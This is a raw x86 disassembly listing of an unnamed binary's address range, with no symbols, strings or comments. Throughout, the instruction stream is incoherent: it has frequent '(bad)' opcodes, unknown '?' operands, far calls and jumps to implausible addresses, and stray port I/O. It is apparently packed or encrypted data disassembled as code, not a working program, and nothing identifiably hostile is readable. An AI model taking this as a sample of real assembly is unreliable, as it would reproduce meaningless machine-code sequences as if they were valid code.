  417d4e:	and    dl,BYTE PTR [ebx+0x6e]
  417d51:	(bad)  
  417d52:	cmp    BYTE PTR ds:0x444a85f5,0xfa
  417d59:	gs test cl,0xbd
  417d5d:	loop   0x417dbf
  417d5f:	(bad)  
  417d61:	jnp    0x417d2b
  417d63:	sbb    bl,0xde
  417d66:	push   esi
  417d67:	sub    edi,esi
  417d69:	pusha  
  417d6a:	lea    ecx,[ebp+0x10]
  417d6d:	dec    esi
  417d6e:	sbb    BYTE PTR [edi-0x4fc4b590],cl
  417d74:	add    cl,BYTE PTR [esi+0x17f2d28]
  417d7a:	das    
  417d7b:	and    DWORD PTR [esi+0x662ea2a4],0x7e
  417d82:	add    eax,0xbc91510e
  417d87:	rcr    eax,0xd5
  417d8a:	mov    edx,0xb8270430
  417d8f:	scas   eax,DWORD PTR es:[edi]
  417d90:	mov    DWORD PTR [ebp+0x3808877a],edi
  417d96:	push   ebx
  417d97:	jecxz  0x417d1b
  417d99:	push   ebp
  417d9a:	rcl    DWORD PTR [ebp+0x32],1
  417d9d:	xchg   esi,eax
  417d9e:	les    ebx,FWORD PTR [ecx]
  417da0:	pop    edx
  417da1:	inc    ebx
  417da2:	xchg   BYTE PTR [edx+0x49038dee],dh
  417da8:	ins    BYTE PTR es:[edi],dx
  417da9:	leave  
  417daa:	ds cwde 
  417dac:	cmp    al,0x16
  417dae:	adc    esp,DWORD PTR [eax]
  417db0:	call   0xb0ae0268
  417db5:	mov    dl,0x90
  417db7:	push   esp
  417db8:	test   BYTE PTR [eax+0x23],dl
  417dbb:	test   al,0xe7
  417dbe:	stos   BYTE PTR es:[edi],al
  417dbf:	mov    edx,0x46083eb0
  417dc4:	xchg   edx,eax
  417dc5:	push   ebx
  417dc6:	in     al,dx
  417dc7:	outs   dx,BYTE PTR gs:[esi]
  417dc9:	icebp  
  417dca:	mov    WORD PTR [ebx-0x7f497ca2],?
  417dd0:	inc    esp
  417dd1:	add    eax,0x6132d27c
  417dd6:	(bad)  
  417dd7:	mov    DWORD PTR [ebp+0x7472aeea],eax
  417ddd:	mov    esp,edi
  417ddf:	fstp   QWORD PTR [ecx]
  417de1:	adc    al,0xad
  417de3:	dec    ebx
  417de4:	mov    cl,0xa2
  417de6:	sbb    dh,ch
  417de8:	nop
  417de9:	mov    ecx,0x68b1f106
  417dee:	push   es
  417def:	add    eax,0x1e71edd8
  417df4:	mov    dl,0x23
  417df6:	or     DWORD PTR [esi+0x41a0fb59],edx
  417dfc:	dec    edi
  417dfd:	pop    ebx
  417dfe:	rdtsc  
  417e00:	push   ebx
  417e01:	fist   DWORD PTR [edi]
  417e03:	sbb    bh,BYTE PTR [eax]
  417e05:	jnp    0x417de9
  417e07:	jbe    0x417e55
  417e09:	stc    
  417e0a:	cmp    dl,BYTE PTR [edi+ebx*8]
  417e0d:	or     al,0x74
  417e0f:	sub    esp,DWORD PTR [edx]
  417e11:	imul   edx
  417e13:	mov    ebx,0x2074deea
  417e18:	neg    esi
  417e1a:	dec    esp
  417e1b:	mov    cl,0xb1
  417e1d:	cmc    
  417e1e:	xor    al,0x39
  417e20:	ins    DWORD PTR es:[edi],dx
  417e21:	call   0x4135:0x78da2cbe
  417e28:	or     BYTE PTR [edi+0x5d],cl
  417e2b:	push   eax
  417e2c:	jbe    0x417dcf
  417e2e:	mov    edi,0x64f37d35
  417e33:	pushf  
  417e34:	xchg   esp,eax
  417e35:	xchg   edx,eax
  417e36:	sahf   
  417e37:	dec    ebx
  417e38:	mov    ch,0xf0
  417e3a:	ss leave 
  417e3c:	(bad)  
  417e3d:	cmp    ebx,DWORD PTR [esi+0x79]
  417e40:	ins    DWORD PTR es:[edi],dx
  417e41:	xchg   esi,eax
  417e42:	fst    st(1)
  417e44:	adc    bl,BYTE PTR cs:[bp+di-0x73]
  417e49:	adc    eax,0x5b0fe626
  417e4e:	loopne 0x417e55
  417e50:	into   
  417e51:	cld    
  417e52:	pop    es
  417e53:	sar    BYTE PTR [eax+0x27],1
  417e56:	mov    ds:0x3ddd2a17,al
  417e5b:	sar    edi,0x1f
  417e5e:	mov    cl,0x3b
  417e60:	or     DWORD PTR [ecx-0x32],0x6e26330b
  417e67:	jns    0x417e50
  417e69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e6a:	sub    eax,0x62d43b
  417e6f:	xchg   esp,eax
  417e70:	xor    al,BYTE PTR [edi]
  417e72:	jg     0x417ea9
  417e74:	sub    edi,esi
  417e76:	pop    edx
  417e77:	sbb    dl,BYTE PTR [ebx]
  417e79:	jnp    0x417ef8
  417e7b:	in     eax,0xfc
  417e7d:	pusha  
  417e7e:	call   DWORD PTR [ebp-0x72]
  417e81:	cs cli 
  417e83:	test   eax,edi
  417e85:	pop    ecx
  417e86:	rcl    BYTE PTR [ebx],cl
  417e88:	and    edi,ebx
  417e8a:	mov    bh,0x2b
  417e8c:	mov    edx,0x25b67dc
  417e91:	pop    esp
  417e92:	mov    ds:0xca214cdf,eax
  417e97:	enter  0x3722,0xe5
  417e9b:	inc    ebp
  417e9c:	loop   0x417ee2
  417e9e:	bound  edx,QWORD PTR [esp+ebp*2]
  417ea1:	adc    eax,0xd4e7c66f
  417ea6:	dec    eax
  417ea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ea8:	cmp    ebx,DWORD PTR [ebp-0x3e9c8f13]
  417eae:	loopne 0x417e36
  417eb0:	cmp    esp,DWORD PTR [edi+0xebfdcb3]
  417eb6:	jo     0x417ee5
  417eb8:	cmp    eax,0xe29cc2cc
  417ebd:	dec    ebp
  417ebe:	aam    0x85
  417ec0:	cmp    dl,BYTE PTR [ecx+eiz*4]
  417ec3:	mov    ss,WORD PTR [edx+0x4]
  417ec6:	add    ebp,ebx
  417ec8:	jns    0x417f24
  417eca:	and    eax,0x56d43fa2
  417ecf:	loop   0x417e8d
  417ed1:	(bad)  
  417ed2:	pop    ss
  417ed3:	sbb    al,0x81
  417ed5:	jle    0x417e78
  417ed7:	scas   eax,DWORD PTR es:[edi]
  417ed8:	retf   0xc21
  417edb:	mov    dh,0x6c
  417edd:	test   eax,0xce0fcf50
  417ee2:	jecxz  0x417ebe
  417ee4:	sbb    eax,0x210bfde
  417ee9:	test   BYTE PTR es:[eax-0x32],dh
  417eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eee:	imul   edi,DWORD PTR [ebp-0x57],0xffffffe9
  417ef2:	mov    BYTE PTR [eax+eax*4],dh
  417ef5:	pop    esp
  417ef6:	sbb    al,0xdb
  417ef8:	pop    ebp
  417ef9:	mov    dl,0xb3
  417efb:	js     0x417efe
  417efd:	push   eax
  417efe:	push   ss
  417eff:	dec    ebx
  417f00:	pusha  
  417f01:	xchg   edi,eax
  417f02:	jmp    0x23217224
  417f07:	adc    BYTE PTR [esi-0x4b],bh
  417f0a:	ins    BYTE PTR es:[edi],dx
  417f0b:	das    
  417f0c:	dec    ecx
  417f0d:	jp     0x417f0b
  417f0f:	data16 repnz int 0x88
  417f13:	out    dx,eax
  417f14:	push   es
  417f15:	(bad)  
  417f16:	mov    ch,0x77
  417f18:	(bad)  
  417f19:	mov    ebx,0x38b984fe
  417f1e:	test   BYTE PTR [eax+0x22f5b982],al
  417f24:	jmp    0x80714d05
  417f29:	mov    dh,0x7
  417f2b:	or     eax,0x4b41a75
  417f30:	loope  0x417ee0
  417f32:	ret    
  417f33:	iret   
  417f34:	out    0xeb,al
  417f36:	push   ecx
  417f37:	push   edx
  417f38:	sbb    eax,DWORD PTR [ebx+0x445386b5]
  417f3e:	addr16 or eax,0x81835ea7
  417f44:	jnp    0x417ef9
  417f46:	dec    edx
  417f47:	ins    DWORD PTR es:[edi],dx
  417f48:	shr    DWORD PTR fs:[edi+0x1668e4d4],cl
  417f4f:	mov    bh,0x64
  417f51:	rcr    cl,cl
  417f53:	cmp    al,0x44
  417f55:	adc    al,0xb7
  417f57:	push   ds
  417f58:	or     ecx,ebx
  417f5a:	(bad)  
  417f5b:	adc    dh,BYTE PTR [edx+0x62b0f025]
  417f61:	out    dx,al
  417f62:	daa    
  417f63:	popa   
  417f64:	mov    al,ah
  417f66:	cli    
  417f67:	ficom  WORD PTR fs:[eax-0x7a]
  417f6b:	xor    eax,DWORD PTR ds:0x198e6aa5
  417f71:	imul   eax,DWORD PTR [ebx],0x8
  417f74:	xor    al,BYTE PTR [edx+0xf55c89e]
  417f7a:	inc    ebx
  417f7b:	xchg   esp,eax
  417f7c:	jne    0x417ffc
  417f7e:	pop    ds
  417f7f:	push   ecx
  417f80:	pushf  
  417f81:	mov    ds:0xfad744d6,al
  417f86:	dec    ebx
  417f87:	adc    BYTE PTR [ecx+0x23],ah
  417f8a:	iret   
  417f8b:	mov    ds:0x57861cf2,al
  417f90:	mov    ecx,0xe31ad22e
  417f95:	cs jmp 0xa152:0xdc81aa8a
  417f9d:	movd   mm6,DWORD PTR [edx]
  417fa0:	inc    esi
  417fa1:	mov    esp,0x601ca1a9
  417fa6:	jge    0x417fc1
  417fa8:	mov    ch,0xe9
  417faa:	jl     0x418022
  417fac:	push   edi
  417fad:	fiadd  WORD PTR [ecx-0x3a267460]
  417fb3:	add    eax,DWORD PTR fs:[edi+edx*1+0x5c]
  417fb8:	mov    esi,DWORD PTR [edi+edi*1-0x31f681e0]
  417fbf:	jne    0x418002
  417fc1:	pop    ebx
  417fc2:	xchg   DWORD PTR [ebx],eax
  417fc4:	scas   eax,DWORD PTR es:[edi]
  417fc5:	ds push 0xce556638
  417fcb:	adc    dl,dl
  417fcd:	and    BYTE PTR ss:[edi+0x3c6fd30d],cl
  417fd4:	mov    eax,ds:0xdd59c27a
  417fd9:	and    BYTE PTR [edx],ch
  417fdb:	mov    ds:0x56625d22,eax
  417fe0:	dec    esp
  417fe1:	leave  
  417fe2:	hlt    
  417fe3:	test   bh,bh
  417fe5:	ficomp WORD PTR [eax]
  417fe7:	ja     0x417ff5
  417fe9:	out    dx,al
  417fea:	fimul  WORD PTR [edi-0x5b7d4791]
  417ff0:	int    0xa9
  417ff2:	cmp    BYTE PTR [ecx+0x64],0x83
  417ff6:	outs   dx,DWORD PTR ds:[esi]
  417ff7:	sub    edi,DWORD PTR [esp+ecx*2]
  417ffa:	or     al,0x0
  417ffc:	leave  
  417ffd:	in     eax,0x6e
  417fff:	stc    
  418000:	ret    
  418001:	sbb    al,0x19
  418003:	dec    edi
  418004:	js     0x418023
  418006:	mov    BYTE PTR [edx],dl
  418008:	mov    ebp,0xbe5fe509
  41800d:	imul   eax,DWORD PTR [edx-0x76],0x2f668ab6
  418014:	arpl   WORD PTR [ecx-0x637b0dab],cx
  41801a:	cmp    esp,eax
  41801c:	repz mov dl,BYTE PTR [esi-0x40]
  418020:	in     eax,0xb
  418022:	mov    cl,0xaf
  418024:	hlt    
  418025:	dec    edx
  418026:	inc    eax
  418027:	fild   DWORD PTR [ebx-0x377238cb]
  41802d:	jb     0x418021
  41802f:	sar    ah,1
  418031:	dec    esi
  418032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418033:	mov    ecx,0x81bd501d
  418038:	adc    BYTE PTR [edx-0x64],bl
  41803b:	aas    
  41803c:	or     edi,edx
  41803e:	cwde   
  41803f:	fstp   TBYTE PTR [edi+ebp*4-0x61]
  418043:	push   esp
  418044:	fwait
  418045:	gs add al,0xeb
  418048:	neg    edx
  41804a:	mul    DWORD PTR [ecx]
  41804c:	sbb    eax,0xf49bc37a
  418051:	cmc    
  418052:	jno    0x4180cf
  418054:	sbb    DWORD PTR [eax-0x676f4f43],edi
  41805a:	push   edi
  41805b:	lds    ebx,FWORD PTR [ebp+edx*4-0x4e]
  41805f:	retf   
  418060:	test   DWORD PTR [ebp+0x46],edx
  418063:	int3   
  418064:	jl     0x4180ad
  418066:	or     BYTE PTR [edi+0x482eafc9],bh
  41806c:	aam    0xde
  41806e:	call   0x5a16:0x983c26f9
  418075:	xor    al,0x4c
  418077:	pop    ds
  418078:	ins    BYTE PTR es:[edi],dx
  418079:	xchg   DWORD PTR [edx+0x4a980fd8],ecx
  41807f:	stos   DWORD PTR es:[edi],eax
  418080:	push   ecx
  418081:	adc    BYTE PTR [esp+esi*1],0x6f
  418085:	(bad)  
  418086:	stos   DWORD PTR es:[edi],eax
  418087:	in     eax,dx
  418088:	and    DWORD PTR [edi+0x17ae2aaf],ecx
  41808e:	xor    dh,BYTE PTR [ebx+esi*2-0x28]
  418092:	xor    DWORD PTR [edx],ecx
  418094:	inc    esi
  418095:	fwait
  418096:	test   al,0xc1
  418098:	popf   
  418099:	call   0x7886f744
  41809e:	out    0x6c,eax
  4180a0:	xchg   ecx,eax
  4180a1:	jno    0x4180a9
  4180a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180a4:	fbld   TBYTE PTR [edi-0x59]
  4180a7:	mov    ?,WORD PTR [esi+0xadd16ca]
  4180ad:	xchg   BYTE PTR [esp+ebp*1-0x7a],al
  4180b1:	dec    eax
  4180b2:	out    dx,eax
  4180b3:	sbb    eax,0x66cf4756
  4180b8:	inc    eax
  4180b9:	jge    0x4180e3
  4180bb:	sub    DWORD PTR [esi+edx*8+0x5a],edx
  4180bf:	sbb    esp,esp
  4180c1:	cmc    
  4180c2:	retf   0xa463
  4180c5:	stos   BYTE PTR es:[edi],al
  4180c6:	fwait
  4180c7:	sbb    DWORD PTR [esi+0x6a61dc2a],esp
  4180cd:	int    0xc1
  4180cf:	stc    
  4180d0:	int    0x35
  4180d2:	and    bh,BYTE PTR [ebp-0x61]
  4180d5:	stos   DWORD PTR es:[edi],eax
  4180d6:	or     BYTE PTR [edi],bl
  4180d8:	ret    
  4180d9:	in     al,dx
  4180da:	xchg   esi,eax
  4180db:	shl    DWORD PTR [ebx+0x48],cl
  4180de:	or     eax,0xa93ce44d
  4180e3:	xchg   edx,eax
  4180e4:	jmp    DWORD PTR [ebp+0x7c]
  4180e7:	adc    DWORD PTR [edi-0x7b],ebp
  4180ea:	push   edx
  4180eb:	neg    esi
  4180ed:	stos   DWORD PTR es:[edi],eax
  4180ee:	add    al,0x29
  4180f0:	stos   DWORD PTR es:[edi],eax
  4180f1:	add    ch,BYTE PTR [edi]
  4180f3:	stc    
  4180f4:	mov    esp,DWORD PTR [edx+0x5c]
  4180f7:	cmp    eax,0x77cff7d8
  4180fc:	sub    BYTE PTR [ecx],cl
  4180fe:	xchg   ecx,eax
  4180ff:	and    dl,BYTE PTR [ecx]
  418101:	pop    esp
  418102:	stos   BYTE PTR es:[edi],al
  418103:	inc    edi
  418104:	repz jbe 0x418132
  418107:	ins    DWORD PTR es:[edi],dx
  418108:	out    0xd8,eax
  41810a:	push   0xbd42b438
  41810f:	pop    ds
  418110:	push   cs
  418111:	mov    esi,0xc2bff8a4
  418116:	mov    bl,0xff
  418118:	fsubr  DWORD PTR [eax+0x5b]
  41811b:	xchg   DWORD PTR [esi-0x33d92f53],edi
  418121:	jno    0x418113
  418123:	outs   dx,DWORD PTR ds:[esi]
  418124:	mov    ebx,0xe36905ad
  418129:	jge    0x418132
  41812b:	or     eax,0x60
  41812e:	dec    edx
  41812f:	pop    ds
  418130:	mov    ds:0xaeb57acb,eax
  418135:	ins    BYTE PTR es:[edi],dx
  418136:	repnz mov ch,0x75
  418139:	ror    ah,0xff
  41813c:	pop    esi
  41813d:	arpl   sp,sp
  41813f:	lds    esi,FWORD PTR [eax-0x20]
  418142:	loope  0x4180f5
  418144:	adc    cl,BYTE PTR [esi-0x4f99a6e1]
  41814a:	mov    DWORD PTR [ebx+0x16cb98c4],0xc60ca6a8
  418154:	mov    ds:0x12ea0753,eax
  418159:	jne    0x418108
  41815b:	add    eax,0x82ca872c
  418160:	dec    eax
  418161:	mov    eax,ds:0x5a1ac0e6
  418166:	mov    ss,WORD PTR ds:0xe35be63f
  41816c:	call   0x8a20:0x9d3e0dbe
  418173:	inc    ebp
  418174:	mov    al,ds:0xe404f3b5
  418179:	jle    0x41812b
  41817b:	add    eax,0xeda2b90c
  418180:	out    dx,eax
  418181:	loop   0x4181fa
  418183:	int    0x4a
  418185:	(bad)  
  418186:	mov    dh,0x52
  418188:	fisub  DWORD PTR [ebp+0x561b18a7]
  41818e:	cwde   
  41818f:	and    bl,BYTE PTR [esi+eiz*4]
  418192:	dec    edi
  418193:	xor    DWORD PTR [ebx],esi
  418195:	rcl    DWORD PTR [ebx+esi*2+0x10],1
  418199:	(bad)  
  41819a:	sti    
  41819b:	mov    bl,0xf5
  41819d:	clc    
  41819e:	addr16 cmp eax,ebx
  4181a1:	sbb    eax,0xc2a232bb
  4181a6:	bound  eax,QWORD PTR [esi]
  4181a8:	push   0xffffffbe
  4181aa:	mov    esi,0x479fae32
  4181af:	cld    
  4181b0:	scas   eax,DWORD PTR es:[edi]
  4181b1:	jp     0x418150
  4181b3:	std    
  4181b4:	sar    bl,cl
  4181b6:	push   ebx
  4181b7:	sub    BYTE PTR [ecx],ah
  4181b9:	pop    es
  4181ba:	jmp    FWORD PTR [edx+edi*1-0x111546c0]
  4181c1:	sbb    DWORD PTR [ecx],edx
  4181c3:	pop    es
  4181c4:	mov    bl,0x54
  4181c6:	enter  0x656d,0x1d
  4181ca:	xchg   BYTE PTR [ebx-0x7327b4fe],ch
  4181d0:	adc    BYTE PTR [edi],cl
  4181d2:	fist   WORD PTR [edi-0x5a]
  4181d5:	fcom   QWORD PTR [esi+0x6e]
  4181d8:	lds    ecx,FWORD PTR ds:0xef9f5a08
  4181de:	adc    DWORD PTR gs:0x92fb2e44,eax
  4181e5:	fsub   DWORD PTR [edx]
  4181e7:	in     eax,dx
  4181e8:	js     0x4181eb
  4181ea:	fsub   DWORD PTR [ebp-0x754fa320]
  4181f0:	lahf   
  4181f1:	sbb    dl,BYTE PTR [eax+0x4e]
  4181f4:	pop    ebp
  4181f5:	ds pop eax
  4181f7:	jecxz  0x41822d
  4181f9:	push   ecx
  4181fa:	(bad)  
  4181fb:	mov    eax,0x17e6d5a3
  418200:	(bad)  [eax]
  418202:	add    BYTE PTR [ecx-0x16],al
  418205:	inc    edx
  418206:	add    eax,0x4858cf2c
  41820c:	in     al,dx
  41820d:	mov    edx,0x24fd24fd
  418212:	or     al,0xda
  418214:	(bad)  
  418216:	aad    0xaa
  418218:	div    BYTE PTR [ebx-0x7b967fd6]
  41821e:	fcomp  DWORD PTR [ebp+0x44419fdb]
  418224:	jb     0x4181e3
  418226:	push   cs
  418227:	loopne 0x418295
  418229:	test   eax,0xa5b26c47
  41822e:	pop    ebp
  41822f:	jmp    0xbcfe94e
  418234:	mov    ah,0x98
  418236:	jmp    0x15c38466
  41823b:	loop   0x4182b2
  41823d:	int3   
  41823e:	jno    0x4182a7
  418240:	lock cld 
  418242:	xchg   ebx,eax
  418243:	leave  
  418244:	ins    DWORD PTR es:[edi],dx
  418245:	(bad)  
  418246:	sbb    DWORD PTR [ecx],edx
  418248:	or     dh,BYTE PTR [ebp-0x237db63c]
  41824e:	push   edi
  41824f:	push   cs
  418250:	add    eax,0x82dac6c2
  418255:	pop    ss
  418256:	stos   BYTE PTR es:[edi],al
  418257:	sbb    bh,BYTE PTR [ecx+0xf837cea]
  41825d:	pop    ebp
  41825e:	mov    dh,0x7a
  418260:	mov    esi,0xce843786
  418265:	test   BYTE PTR [ebp-0xe4c92aa],dl
  41826b:	pop    edx
  41826c:	sbb    ch,BYTE PTR [esi]
  41826e:	sub    edi,edi
  418270:	into   
  418271:	mov    ecx,0x2dcb553a
  418276:	jge    0x4182d2
  418278:	ins    BYTE PTR es:[edi],dx
  418279:	sbb    DWORD PTR [edx],ecx
  41827b:	mov    cl,0xa5
  41827d:	ret    0xdf54
  418280:	(bad)  
  418281:	mov    eax,DWORD PTR [ebp+0x25]
  418284:	jbe    0x41826c
  418286:	pop    eax
  418287:	jmp    0x418219
  418289:	(bad)  
  41828a:	mov    dl,0xa7
  41828c:	push   ecx
  41828d:	pusha  
  41828e:	pop    ebp
  41828f:	jo     0x418245
  418291:	push   0x2c7eea95
  418296:	sahf   
  418297:	cdq    
  418298:	sbb    bh,BYTE PTR [edx+ecx*8]
  41829b:	mov    eax,0xd16ff8de
  4182a0:	push   es
  4182a1:	jnp    0x41831a
  4182a3:	sbb    BYTE PTR [eax+ecx*2+0x55],dl
  4182a7:	pusha  
  4182a8:	xchg   esi,eax
  4182a9:	push   ss
  4182aa:	outs   dx,BYTE PTR ds:[esi]
  4182ab:	sub    ah,bh
  4182ad:	mov    esp,esp
  4182af:	mov    ch,0xe8
  4182b1:	pop    ebp
  4182b2:	add    DWORD PTR [ebx+0x65],0x61908fa9
  4182b9:	test   DWORD PTR [ecx-0x4bb4fb35],ebp
  4182bf:	mov    BYTE PTR [esi+0x79c007cb],ah
  4182c5:	fsubrp st(7),st
  4182c7:	outs   dx,DWORD PTR ds:[esi]
  4182c8:	fdivp  st(3),st
  4182ca:	jp     0x41833b
  4182cc:	clc    
  4182cd:	sub    BYTE PTR ds:0x1802df53,cl
  4182d3:	das    
  4182d4:	sbb    eax,0xad3782e
  4182d9:	test   eax,0xe046445e
  4182de:	sub    bl,0x3d
  4182e1:	sahf   
  4182e2:	stos   DWORD PTR es:[edi],eax
  4182e3:	inc    esp
  4182e4:	and    dh,BYTE PTR [ebx-0x33]
  4182e7:	cmp    al,bl
  4182e9:	xchg   ecx,eax
  4182ea:	sub    BYTE PTR [ebp+0x124a5051],0x15
  4182f1:	xor    bh,al
  4182f3:	sar    BYTE PTR [edi-0x94bf6a8],0x24
  4182fa:	aam    0xda
  4182fc:	sahf   
  4182fd:	fwait
  4182fe:	mov    ss,WORD PTR [edx]
  418300:	inc    esp
  418301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418302:	jbe    0x4182c3
  418304:	gs out 0x5a,eax
  418307:	arpl   WORD PTR [edx-0x263688c2],ax
  41830d:	dec    esp
  41830e:	mov    dl,0xb8
  418310:	enter  0xc18c,0xa5
  418314:	fwait
  418315:	jg     0x418346
  418317:	cvttps2pi mm7,xmm3
  41831a:	ret    
  41831b:	rol    DWORD PTR [esi-0x3dbf6e99],cl
  418321:	sub    al,0xa3
  418323:	(bad)  
  418324:	cmc    
  418325:	cmp    ebp,edi
  418327:	retf   0x4e74
  41832a:	mov    es,WORD PTR [eax+0x1bc53319]
  418330:	push   esp
  418331:	xchg   BYTE PTR [esi-0x24],bl
  418334:	leave  
  418335:	mov    esp,0x322c10a7
  41833a:	sub    ecx,DWORD PTR [eax+0x7af8de4b]
  418340:	clc    
  418341:	cmp    BYTE PTR [ebx+0x46e62a7d],bl
  418347:	adc    eax,0x9856c5c3
  41834c:	test   ebp,esp
  41834e:	scas   al,BYTE PTR es:[edi]
  41834f:	mov    ecx,DWORD PTR [ebp-0x66]
  418352:	adc    BYTE PTR [ebx],ch
  418354:	arpl   WORD PTR [edx],ax
  418356:	retf   0x68ee
  418359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41835a:	scas   al,BYTE PTR es:[edi]
  41835b:	mov    cl,0xeb
  41835d:	out    0x84,eax
  41835f:	xor    BYTE PTR [ecx-0x72],dl
  418362:	xchg   ebp,eax
  418363:	mov    ds:0x8670f278,al
  418368:	stos   BYTE PTR es:[edi],al
  418369:	cmovb  ecx,DWORD PTR [ebx+0x41235b0d]
  418370:	add    ah,BYTE PTR [ebp-0x55e2c265]
  418376:	dec    eax
  418377:	dec    ebx
  418378:	xor    edi,edi
  41837a:	mov    al,ds:0x42fe7704
  41837f:	aad    0xa4
  418381:	mov    ds:0x46a0ed9c,eax
  418386:	(bad)  
  418387:	popf   
  418388:	add    DWORD PTR [ecx-0x2c],ecx
  41838b:	pushf  
  41838c:	xchg   edi,eax
  41838d:	out    dx,al
  41838e:	bndldx bnd0,ss:[esi+edx*1]
  418393:	jp     0x4183d2
  418395:	and    dl,BYTE PTR [edi+esi*8-0x5a5c6092]
  41839c:	(bad)  
  41839d:	imul   esi,DWORD PTR [edi-0x709afd2e],0x94e12ee9
  4183a7:	fsubr  st,st(4)
  4183a9:	mov    dl,0xce
  4183ab:	cld    
  4183ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183ad:	dec    edi
  4183ae:	les    esi,FWORD PTR cs:[ecx+0x17]
  4183b2:	dec    eax
  4183b3:	in     eax,dx
  4183b4:	inc    edi
  4183b5:	shl    DWORD PTR [ecx+0x6a],cl
  4183b8:	xor    eax,0x314942ba
  4183bd:	outs   dx,DWORD PTR ds:[esi]
  4183be:	outs   dx,BYTE PTR ds:[esi]
  4183bf:	call   0x32e87303
  4183c4:	aam    0xac
  4183c6:	int3   
  4183c7:	and    al,0x67
  4183c9:	arpl   WORD PTR [edi+0x38],dx
  4183cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183cd:	pop    ebp
  4183ce:	add    al,0xcf
  4183d0:	gs jp  0x418427
  4183d3:	dec    ebx
  4183d4:	pusha  
  4183d5:	xor    BYTE PTR [esi+0x311b3f4f],dh
  4183db:	add    eax,0x4f8e099c
  4183e0:	xchg   edx,eax
  4183e1:	(bad)  
  4183e2:	cmp    DWORD PTR [ebx],edi
  4183e4:	sbb    bl,dl
  4183e6:	jge    0x418460
  4183e8:	pop    esi
  4183e9:	or     ebp,edi
  4183eb:	inc    BYTE PTR ds:0xdddc65bf
  4183f1:	add    BYTE PTR [edx+0x8],al
  4183f4:	mov    eax,0xe2552582
  4183f9:	xor    ecx,DWORD PTR [eax]
  4183fb:	xor    eax,0xd80165f3
  418400:	icebp  
  418401:	xchg   BYTE PTR [ebp-0x1c3f860f],dh
  418407:	cmp    al,0x4
  418409:	rcr    BYTE PTR [eax+0x6aeb2c92],1
  41840f:	xchg   ecx,eax
  418410:	clc    
  418411:	ror    BYTE PTR [eax+0x34],0x40
  418415:	das    
  418416:	fstp   TBYTE PTR [esi-0x78]
  418419:	into   
  41841a:	in     al,dx
  41841b:	cmp    BYTE PTR [edi],ch
  41841d:	jmp    0xc3e2c9b9
  418422:	mov    esp,0xd2434001
  418427:	jae    0x418407
  418429:	in     al,0x3
  41842b:	and    ecx,ebx
  41842d:	data16 stos BYTE PTR es:[edi],al
  41842f:	mov    edx,?
  418431:	cwde   
  418432:	jae    0x41841f
  418434:	ds pop esp
  418436:	outs   dx,DWORD PTR ds:[esi]
  418437:	shr    DWORD PTR [ebx-0x197bb7a3],0xb1
  41843e:	ins    DWORD PTR es:[edi],dx
  41843f:	ffreep st(6)
  418441:	aaa    
  418442:	push   edx
  418444:	out    0x59,eax
  418446:	sub    BYTE PTR [edi+esi*4+0x6ed53014],0x7f
  41844e:	std    
  41844f:	sbb    edx,DWORD PTR [ecx]
  418451:	adc    al,0xfa
  418453:	and    al,ch
  418455:	add    al,0xe8
  418457:	push   ebp
  418458:	and    ch,BYTE PTR [eax-0x64]
  41845b:	mov    dl,0x95
  41845d:	and    al,0x41
  41845f:	repnz xchg edx,eax
  418461:	dec    esp
  418462:	push   ecx
  418463:	loop   0x41849a
  418465:	in     eax,dx
  418466:	lods   al,BYTE PTR ds:[esi]
  418467:	sbb    DWORD PTR [eax+0x31],ebx
  41846a:	fcomip st,st(1)
  41846c:	dec    edx
  41846d:	jge    0x418414
  41846f:	out    dx,al
  418470:	cdq    
  418471:	and    esi,DWORD PTR [ebx+0xba04112]
  418477:	or     eax,DWORD PTR [ecx]
  418479:	jge    0x4184b9
  41847b:	pop    edi
  41847c:	icebp  
  41847d:	out    0x4c,al
  41847f:	mov    al,0x27
  418481:	in     al,0x9c
  418483:	inc    ebp
  418484:	cmp    eax,0xae5a9d8c
  418489:	sbb    DWORD PTR [esi+edx*4],esp
  41848c:	aam    0xc9
  41848e:	sub    eax,0x322fce50
  418493:	popf   
  418494:	test   eax,0xfd8dfee3
  418499:	mov    ch,0xe5
  41849b:	mov    bl,0xfb
  41849d:	in     al,dx
  41849e:	test   al,0x46
  4184a0:	and    DWORD PTR [esp+esi*8],0xe00d79e
  4184a7:	sub    eax,esi
  4184a9:	push   eax
  4184aa:	retf   
  4184ab:	and    al,0x66
  4184ad:	ret    0x67b
  4184b0:	mov    ah,0x6d
  4184b2:	inc    ecx
  4184b3:	retf   0x251b
  4184b6:	pop    edx
  4184b7:	and    DWORD PTR [edx-0x15],edx
  4184ba:	loope  0x41853a
  4184bc:	dec    edi
  4184bd:	pop    edx
  4184be:	lods   eax,DWORD PTR ds:[esi]
  4184bf:	adc    DWORD PTR [eax+0x7a],0xffffff81
  4184c3:	cmp    dh,BYTE PTR [edx+0x11518f1c]
  4184c9:	add    bl,BYTE PTR [eax]
  4184cb:	or     ebx,DWORD PTR [ecx+0x6bb12487]
  4184d1:	imul   esp,esi,0xf71e4f3b
  4184d7:	mov    ch,0xf8
  4184d9:	jp     0x418508
  4184db:	in     eax,dx
  4184dc:	stos   DWORD PTR es:[edi],eax
  4184dd:	leave  
  4184de:	cmp    dl,BYTE PTR [ebp+0x50]
  4184e1:	or     eax,0x86bdf11e
  4184e6:	sbb    DWORD PTR [eax-0x3317e48d],esp
  4184ec:	sbb    BYTE PTR [edi+esi*8+0x10281e2f],ch
  4184f3:	mov    bl,0x96
  4184f5:	test   cl,0x62
  4184f8:	out    0x1a,al
  4184fa:	es inc esp
  4184fc:	jae    0x4184a5
  4184fe:	mov    ds:0xee05cec6,al
  418503:	nop
  418504:	ror    BYTE PTR ds:0x8bfe9f36,cl
  41850a:	mov    esi,0xd300ff85
  41850f:	imul   edx,DWORD PTR [esi],0x87f068d4
  418515:	push   edi
  418516:	and    al,0x8c
  418518:	pop    edx
  418519:	cmp    BYTE PTR [edx-0x45],dh
  41851c:	imul   edx,DWORD PTR [ebx],0xa35199ec
  418522:	xor    ebx,DWORD PTR [edx-0x5c]
  418525:	bound  edi,QWORD PTR [eax+0x3c]
